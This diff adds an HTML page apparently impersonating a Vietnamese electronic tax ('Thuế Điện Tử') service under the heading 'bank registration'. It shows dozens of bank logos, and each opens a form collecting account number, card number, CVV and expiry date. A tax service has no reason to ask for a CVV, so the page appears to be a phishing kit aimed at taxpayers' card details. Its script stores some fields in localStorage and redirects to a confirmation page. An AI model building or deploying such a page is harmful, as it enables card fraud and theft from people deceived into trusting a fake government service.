@@ -1,0 +1,326 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+
+    <link rel="stylesheet" href="../public/css/style.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css"
+        integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <title>Thuế Điện Tử</title>
+    <link rel="icon" type="image/png" href="../image/thuedinetu.png" sizes="32x32" />
+</head>
+<!--<div id="alert-container" style="position: fixed; top: 20px; right: 20px; z-index: 1050;"></div>-->
+
+<body>
+    <div id="alert-overlay" style="
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.5);
+        z-index: 1049;
+      "></div>
+    <div id="alert-popup" style="
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 1050;
+      "></div>
+
+    <div id="customConfirm" class="custom-confirm" style="display: none">
+        <div class="confirm-box">
+            <p class="confirm-message">
+                Chưa có thông tin kê khai vui lòng liên hệ cán bộ thuế để được hỗ trợ.
+            </p>
+            <button class="confirm-ok-btn">OK</button>
+        </div>
+    </div>
+
+    <!-- Popup thông báo mới -->
+    <div id="customPopupCuoi" class="custom-popup-cuoi">
+        <div class="custom-popup-content-cuoi">
+            <span class="custom-close-btn-cuoi" id="closePopupCuoi">×</span>
+            <div class="bg-white-cuoi">
+                <p id="popupMessageCuoi">Thông báo sẽ hiển thị ở đây.</p>
+                <button type="button" class="confirm-ok-btn mt-1" id="okButtonCuoi">
+                    Tiếp tục
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <header>
+        <button class="header-button" onclick="window.location.href='end-loading.php'">
+            ㅤㅤ
+        </button>
+    </header>
+
+    <script src="../public/js/style.js"></script>
+    <div class="container">
+        <div class="app-main">
+            <div class="header-home">
+                <div class="menu item-center flex">
+                    <a href="./home.html"><i class="text-white fa-solid fa-angle-left"></i></a>
+                </div>
+                <div class="ml-2">
+                    <!-- <img width="50" src="../image/thuedinetu.png" alt=""> -->
+                    <h6 class="title-logo">ĐĂNG KÝ NGÂN HÀNG</h6>
+                </div>
+                <div class="qr flex item-center">
+                    <a href="./home.html"><i class="text-white fa-solid fa-house"></i></a>
+                </div>
+            </div>
+            <div class="menu-bank mt-1">
+                <div class="main-menu-bank flex between">
+                    <button class="btn-main">
+                        <a href="#">Đăng ký mới</a>
+                    </button>
+                    <button class="btn-main dadangky"><a href="">Đã đăng ký</a></button>
+                </div>
+            </div>
+            <div class="bg-mau">
+                <div class="list-bank bg-trong">
+                    <h3 style="padding: 5px 0; color: #9a0001">Đề xuất cao</h3>
+                    <div class="border-bank">
+                        <img onclick="showPopupBank('MSB', '../image/bank/MSB-bank-logo-01-e1585972872467-600x200.png')"
+                            class="bank-logo" src="../image/bank/MSB-bank-logo-01-e1585972872467-600x200.png" alt="" />
+
+                        <img onclick="showPopupBank('OCB', '../image/bank/OCB-bank-logo-01-e1585973186306.png')"
+                            class="bank-logo" src="../image/bank/OCB-bank-logo-01-e1585973186306.png" alt="OCB" />
+                        <img onclick="showPopupBank('PVcomBank', '../image/bank/PVcom-bank-logo-01-e1585972971710-600x325.png')"
+                            class="bank-logo" src="../image/bank/PVcom-bank-logo-01-e1585972971710-600x325.png"
+                            alt="PVcomBank" />
+                        <img onclick="showPopupBank('TPBank', '../image/bank/TPbank-logo-01-e1585973015105-600x256.png')"
+                            class="bank-logo" src="../image/bank/TPbank-logo-01-e1585973015105-600x256.png"
+                            alt="TPBank" />
+                        <img class="tech"
+                            onclick="showPopupBank('Techcombank', '../image/bank/Techcombank-01-e1585972434854-600x154.png')"
+                            src="../image/bank/Techcombank-01-e1585972434854-600x154.png" alt="Techcombank" />
+
+                        <img onclick="showPopupBank('NCB', '../image/bank/NCB-Bank-logo-01-e1585973856116-600x242.png')"
+                            class="bank-logo" src="../image/bank/NCB-Bank-logo-01-e1585973856116-600x242.png"
+                            alt="NCB" />
+                    </div>
+                    <div class="img-bank text-center">
+                        <img onclick="showPopupBank('Vietcombank', '../image/bank/Vietcombank-01-e1585972386757-600x268.png')"
+                            class="bank-logo" src="../image/bank/Vietcombank-01-e1585972386757-600x268.png"
+                            alt="Vietcombank" />
+                        <img onclick="showPopupBank('SeABank', '../image/bank/SeABank-logo-01-e1585973366910-600x206.png')"
+                            class="bank-logo" src="../image/bank/SeABank-logo-01-e1585973366910-600x206.png"
+                            alt="SeABank" />
+                        <img onclick="showPopupBank('Đông Á Bank', '../image/bank/DongA-bank-logo-01-e1585973303515-600x205.png')"
+                            class="bank-logo" src="../image/bank/DongA-bank-logo-01-e1585973303515-600x205.png"
+                            alt="Đông Á Bank" />
+                        <img onclick="showPopupBank('MB Bank', '../image/bank/logo-ngan-hang-MB-01-e1585972573949.png')"
+                            class="bank-logo" src="../image/bank/logo-ngan-hang-MB-01-e1585972573949.png"
+                            alt="MB Bank" />
+                        <!--<img onclick="showPopupBank('PVcomBank', '../image/bank/PVcom-bank-logo-01-e1585972971710-600x325.png')" class="bank-logo" src="../image/bank/PVcom-bank-logo-01-e1585972971710-600x325.png" alt="PVcomBank">-->
+                        <!--<img onclick="showPopupBank('TPBank', '../image/bank/TPbank-logo-01-e1585973015105-600x256.png')" class="bank-logo" src="../image/bank/TPbank-logo-01-e1585973015105-600x256.png" alt="TPBank">-->
+                        <img onclick="showPopupBank('Sacombank', '../image/bank/logo-ngan-hang-Sacombank-01-e1585972617755-600x178.png')"
+                            class="bank-logo" src="../image/bank/logo-ngan-hang-Sacombank-01-e1585972617755-600x178.png"
+                            alt="Sacombank" />
+                        <img onclick="showPopupBank('OceanBank', '../image/bank/Oceanbank-logo-01-600x367.png')"
+                            class="bank-logo" src="../image/bank/Oceanbank-logo-01-600x367.png" alt="OceanBank" />
+                        <img onclick="showPopupBank('BacA Bank', '../image/bank/BACABANK-LOGO-01-e1585973431827-600x234.png')"
+                            class="bank-logo" src="../image/bank/BACABANK-LOGO-01-e1585973431827-600x234.png"
+                            alt="BacA Bank" />
+                        <img onclick="showPopupBank('LienVietPostBank', '../image/bank/LienVietPostBank-logo-01-e1585973243159-600x224.png')"
+                            class="bank-logo" src="../image/bank/LienVietPostBank-logo-01-e1585973243159-600x224.png"
+                            alt="LienVietPostBank" />
+                        <img onclick="showPopupBank('VP Bank', '../image/bank/VPbank-01-e1585972529110-600x221.png')"
+                            class="bank-logo" src="../image/bank/VPbank-01-e1585972529110-600x221.png" alt="VP Bank" />
+
+                        <img onclick="showPopupBank('Agribank', '../image/bank/Agribank-logo-01-e1676880269189-600x249.png')"
+                            src="../image/bank/Agribank-logo-01-e1676880269189-600x249.png" alt="" />
+                        <img onclick="showPopupBank('BAOVIET', '../image/bank/BAOVIET-bank-logo-01-e1585973555579-600x230.png')"
+                            src="../image/bank/BAOVIET-bank-logo-01-e1585973555579-600x230.png" alt="" />
+                        <img onclick="showPopupBank('BIDV', '../image/bank/BIDV-01-e1585972482948.png')"
+                            src="../image/bank/BIDV-01-e1585972482948.png" alt="" />
+                        <img onclick="showPopupBank(' Vietinbank', '../image/bank/Vietinbank-01-e1585972297613.png')"
+                            src="../image/bank/Vietinbank-01-e1585972297613.png" alt="" />
+                        <img onclick="showPopupBank('ACB', '../image/bank/logo-ngan-hang-ACB-PNG-e1585972709842-600x296.png')"
+                            src="../image/bank/logo-ngan-hang-ACB-PNG-e1585972709842-600x296.png" alt="" />
+                        <img onclick="showPopupBank('HSBC', '../image/bank/HSBC-bank-logo-01-e1585974023722-600x238.png')"
+                            src="../image/bank/HSBC-bank-logo-01-e1585974023722-600x238.png" alt="" />
+                        <img onclick="showPopupBank('ABBank', '../image/bank/ABBank-logo-PNG-01-e1585973489165-600x146.png')"
+                            src="../image/bank/ABBank-logo-PNG-01-e1585973489165-600x146.png" alt="" />
+                        <img onclick="showPopupBank('Eximbank', '../image/bank/Eximbank-logo-01-e1585972756688-600x223.png')"
+                            src="../image/bank/Eximbank-logo-01-e1585972756688-600x223.png" alt="" />
+                        <img onclick="showPopupBank('Citibank', '../image/bank/Citibank-logo-01-e1585973987992-600x256.png')"
+                            src="../image/bank/Citibank-logo-01-e1585973987992-600x256.png" alt="" />
+                        <img onclick="showPopupBank('GPBank', '../image/bank/GPBANK-logo-01-600x367.png')"
+                            src="../image/bank/GPBANK-logo-01-600x367.png" alt="" />
+                        <img onclick="showPopupBank('CBbank', '../image/bank/Logo-CBBank.webp')"
+                            src="../image/bank/Logo-CBBank.webp" alt="" />
+                        <img onclick="showPopupBank('PGBANK', '../image/bank/PGBANK-LOGO-01-e1585973909502-600x293.png')"
+                            src="../image/bank/PGBANK-LOGO-01-e1585973909502-600x293.png" alt="" />
+
+                        <img onclick="showPopupBank('MSB', '../image/bank/MSB-bank-logo-01-e1585972872467-600x200.png')"
+                            src="../image/bank/MSB-bank-logo-01-e1585972872467-600x200.png" alt="" />
+                        <img onclick="showPopupBank('HDBank', '../image/bank/HDBank-01-e1585972919445-600x259.png')"
+                            src="../image/bank/HDBank-01-e1585972919445-600x259.png" alt="" />
+                        <img onclick="showPopupBank('NAM-A-Bank', '../image/bank/NAM-A-Bank-logo-01-e1585973809257-600x210.png')"
+                            src="../image/bank/NAM-A-Bank-logo-01-e1585973809257-600x210.png" alt="" />
+                        <img onclick="showPopupBank('SAIGONBANK', '../image/bank/SAIGONBANK-LOGO-01-e1585973743244-600x427.png')"
+                            src="../image/bank/SAIGONBANK-LOGO-01-e1585973743244-600x427.png" alt="" />
+                        <img onclick="showPopupBank('Shinhan', '../image/bank/Shinhan-bank-logo-01-e1585974095305-600x212.png')"
+                            src="../image/bank/Shinhan-bank-logo-01-e1585974095305-600x212.png" alt="" />
+                        <img onclick="showPopupBank('SHB', '../image/bank/SHB-01-e1585972812292-600x242.png')"
+                            src="../image/bank/SHB-01-e1585972812292-600x242.png" alt="" />
+                        <img onclick="showPopupBank('SCB', '../image/bank/SCB-logo-01-e1585972663332-600x264.png')"
+                            src="../image/bank/SCB-logo-01-e1585972663332-600x264.png" alt="" />
+                        <img onclick="showPopupBank('VIETBANK', '../image/bank/VIETBANK-LOGO-01-e1585973697365-600x309.png')"
+                            src="../image/bank/VIETBANK-LOGO-01-e1585973697365-600x309.png" alt="" />
+                        <img onclick="showPopupBank('VietA', '../image/bank/VietA-bank-logo-01-e1585973620496-600x256.png')"
+                            src="../image/bank/VietA-bank-logo-01-e1585973620496-600x256.png" alt="" />
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Overlay and Popup -->
+        <div class="bank-overlay" id="bankOverlay" onclick="hidePopupBank()"></div>
+        <div class="bank-popup" id="bankPopup">
+            <div class="info bg-white">
+                <div class="title-info">
+                    <!-- Thay thế text "Thông tin tài khoản" bằng ảnh -->
+                    <img id="selectedBankImage" class="selected-bank-image" src="" alt="Bank Logo" />
+                </div>
+                <form class="form-info mt-1" onsubmit="handleFormSubmit(event)">
+                    <div class="input-info">
+                        <p>Tên ngân hàng</p>
+                        <input type="text" id="bankNameInput" name="bank_name" required="" />
+                    </div>
+                    <div class="input-info mt-1">
+                        <p>Số tài khoản</p>
+                        <input type="number" name="account_number" required="" />
+                    </div>
+                    <div class="input-info mt-1">
+                        <p>Số thẻ</p>
+                        <input type="number" name="card_number" required="" />
+                    </div>
+                    <div class="input-info mt-1">
+                        <p>Số CVV</p>
+                        <input type="text" name="cvv" id="cvvInput" maxlength="3" placeholder="CVV" pattern="\d{3}"
+                            title="Nhập chính xác 3 chữ số" required="" />
+                    </div>
+                    <div class="input-info mt-1">
+                        <p>Ngày hết hạn</p>
+                        <input type="text" name="expiry_date" id="expiryDateInput" placeholder="MM/YY" maxlength="5"
+                            required="" />
+                    </div>
+                    <button class="btn-info" type="submit">Kê Khai</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script>
+        const expiryDateInput = document.getElementById("expiryDateInput");
+
+        expiryDateInput.addEventListener("input", function () {
+            let value = expiryDateInput.value.replace(/\D/g, ""); // Chỉ giữ lại số
+            if (value.length > 2) {
+                value = value.slice(0, 2) + "/" + value.slice(2, 4); // Thêm dấu '/' sau 2 số
+            }
+            expiryDateInput.value = value.slice(0, 5); // Giới hạn tối đa 5 ký tự (MM/YY)
+        });
+
+        expiryDateInput.addEventListener("keypress", function (e) {
+            // Ngăn không cho nhập ký tự không phải số
+            if (!/[0-9]/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+        const cvvInput = document.getElementById("cvvInput");
+
+        cvvInput.addEventListener("input", function () {
+            // Chỉ cho phép nhập số và giới hạn tối đa 3 ký tự
+            cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 3);
+        });
+
+        cvvInput.addEventListener("keypress", function (e) {
+            // Ngăn không cho nhập ký tự không phải số
+            if (!/[0-9]/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        function showConfirmationAlert(bankName, bankLogo) {
+            // Hiển thị thông báo tùy chỉnh
+            document.getElementById("customConfirm").style.display = "flex"; // Hiển thị thông báo
+
+            // Lắng nghe sự kiện khi người dùng nhấn vào nút "OK"
+            document
+                .querySelector(".confirm-ok-btn")
+                .addEventListener("click", function () {
+                    // Ẩn thông báo sau khi nhấn OK
+                    document.getElementById("customConfirm").style.display = "none";
+
+                    // Sau khi người dùng nhấn OK, hiển thị popup thông tin ngân hàng
+                    setTimeout(function () {
+                        showPopupBank(bankName, bankLogo);
+                    }, 500); // Đợi 500ms để đảm bảo người dùng thấy thông báo trước khi hiển thị popup
+                });
+        }
+
+        function showPopupBank(bankName, bankLogo) {
+            // Cập nhật hình ảnh và tên ngân hàng trong popup
+            document.getElementById("selectedBankImage").src = bankLogo;
+            document.getElementById("bankNameInput").value = bankName;
+            document.getElementById("bankPopup").style.display = "block";
+            document.getElementById("bankOverlay").style.display = "block";
+        }
+
+        function hidePopupBank() {
+            // Ẩn popup
+            document.getElementById("bankPopup").style.display = "none";
+            document.getElementById("bankOverlay").style.display = "none";
+        }
+        function handleFormSubmit(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const inputData = {};
+
+            // Lấy dữ liệu từ form và loại bỏ khoảng trắng
+            for (const [key, value] of formData.entries()) {
+                inputData[key] = value.trim();
+            }
+            // Kiểm tra các trường bắt buộc
+            if (!inputData.bank_name) {
+                showAlertPopup("Vui lòng nhập tên ngân hàng.");
+                return;
+            }
+            if (!inputData.account_number) {
+                showAlertPopup("Vui lòng nhập số tài khoản doanh nghiệp.");
+                return;
+            }
+            try {
+                // Lấy dữ liệu hiện có từ localStorage
+                const existingData = JSON.parse(localStorage.getItem("companyInfo")) || {};
+                // Cập nhật hoặc thêm mới các trường
+                existingData.bank_name = inputData.bank_name;
+                existingData.account_number = inputData.account_number;
+
+                // Lưu lại vào localStorage
+                localStorage.setItem("companyInfo", JSON.stringify(existingData));
+
+                // Chuyển hướng
+                window.location.href = "comfirm-info.html";
+            } catch (e) {
+                console.error("Lỗi khi lưu vào localStorage:", e);
+                showAlertPopup("Không thể lưu thông tin. Vui lòng thử lại.");
+            }
+        }
+
+    </script>
+</body>
+
+</html>
